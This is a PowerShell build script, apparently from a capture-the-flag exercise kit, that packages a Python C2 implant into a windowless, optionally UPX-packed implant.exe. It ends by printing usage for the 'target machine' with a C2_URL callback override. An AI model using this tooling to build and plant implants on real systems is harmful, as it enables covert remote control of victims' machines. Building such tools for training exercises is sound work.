# =============================================================================
# C2 CTF SecOpsDays - Build Script Windows Nativo (PowerShell)
# =============================================================================
# Compila el implant Python a implant.exe usando PyInstaller en Windows nativo.
# Requiere: Python 3.x instalado en Windows.
# Uso:
#   .\build\build_windows_native.ps1
#   .\build\build_windows_native.ps1 -IconPath ".\build\assets\implant.ico"
#   .\build\build_windows_native.ps1 -NoUpx
# =============================================================================

param(
    [string]$OutputDir = "",
    [string]$IconPath  = "",
    [switch]$NoUpx
)

$ErrorActionPreference = "Stop"

$ScriptDir  = Split-Path -Parent $MyInvocation.MyCommand.Path
$RootDir    = Split-Path -Parent $ScriptDir
$ImplantDir = Join-Path $RootDir "implant"

if ($OutputDir -eq "") {
    $OutputDir = Join-Path $RootDir "dist"
}

Write-Host ""
Write-Host "  ╔═══════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "  ║  C2 CTF SecOpsDays - Windows Native Builder      ║" -ForegroundColor Cyan
Write-Host "  ╚═══════════════════════════════════════════════════╝" -ForegroundColor Cyan
Write-Host ""

# [1/4] Verificar Python
Write-Host "[1/4] Verificando Python..." -ForegroundColor Yellow
if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Host "  ✗ Python no encontrado." -ForegroundColor Red
    Write-Host "    Descarga desde: https://www.python.org/downloads/" -ForegroundColor Yellow
    exit 1
}
$pyVersion = python --version 2>&1
Write-Host "  ✓ $pyVersion" -ForegroundColor Green

# [2/4] Verificar e instalar PyInstaller
Write-Host "[2/4] Verificando PyInstaller..." -ForegroundColor Yellow
python -c "import PyInstaller" 2>$null
if ($LASTEXITCODE -ne 0) {
    Write-Host "  [*] Instalando PyInstaller..." -ForegroundColor Yellow
    pip install pyinstaller --quiet
}
$pyiVersion = python -m PyInstaller --version 2>&1
Write-Host "  ✓ PyInstaller $pyiVersion" -ForegroundColor Green

# Instalar dependencias del implant
pip install -r (Join-Path $RootDir "implant\requirements.txt") --quiet
Write-Host "  ✓ Dependencias instaladas" -ForegroundColor Green

# Detectar UPX
$UpxFlag = @()
if (-not $NoUpx) {
    $upxCmd = Get-Command upx -ErrorAction SilentlyContinue
    if ($upxCmd) {
        $UpxFlag = @("--upx-dir=$($upxCmd.Directory)")
        Write-Host "  ✓ UPX encontrado: compresion activada" -ForegroundColor Green
    } else {
        Write-Host "  ⚠ UPX no encontrado - binario sin comprimir" -ForegroundColor Yellow
        Write-Host "    Descargar desde: https://github.com/upx/upx/releases" -ForegroundColor Yellow
    }
}

# Detectar icono
$IconFlag = @()
if ($IconPath -ne "" -and (Test-Path $IconPath)) {
    $IconFlag = @("--icon=$IconPath")
    Write-Host "  ✓ Icono: $IconPath" -ForegroundColor Green
} elseif ($IconPath -ne "") {
    Write-Host "  ⚠ Icono no encontrado en: $IconPath" -ForegroundColor Yellow
}

# [3/4] Compilar
Write-Host "[3/4] Compilando implant.exe..." -ForegroundColor Yellow
Set-Location $ImplantDir

$PyiArgs = @(
    "--onefile",
    "--noconsole",
    "--name", "implant.exe",
    "--distpath", $OutputDir,
    "--add-data", "..\profiles\default.yaml;profiles",
    "--hidden-import", "yaml",
    "--clean",
    "--noconfirm"
) + $UpxFlag + $IconFlag + @("implant.py")

python -m PyInstaller @PyiArgs

# [4/4] Verificar resultado
Write-Host "[4/4] Verificando resultado..." -ForegroundColor Yellow
$OutFile = Join-Path $OutputDir "implant.exe"

if (Test-Path $OutFile) {
    $SizeMB = [math]::Round((Get-Item $OutFile).Length / 1MB, 2)
    Write-Host ""
    Write-Host "  ✓ Build exitoso" -ForegroundColor Green
    Write-Host "  → Archivo : $OutFile"
    Write-Host "  → Tamano  : $SizeMB MB"
    Write-Host "  → Modo    : background (sin ventana de consola)"
    Write-Host ""
    Write-Host "  Uso en la maquina objetivo:" -ForegroundColor Cyan
    Write-Host "    implant.exe                          # usa C2_URL del profile embebido"
    Write-Host "    `$env:C2_URL='http://IP:8080'; .\implant.exe  # override de URL"
    Write-Host ""
} else {
    Write-Host "  ✗ Build fallido. Revisa el output de PyInstaller." -ForegroundColor Red
    exit 1
}
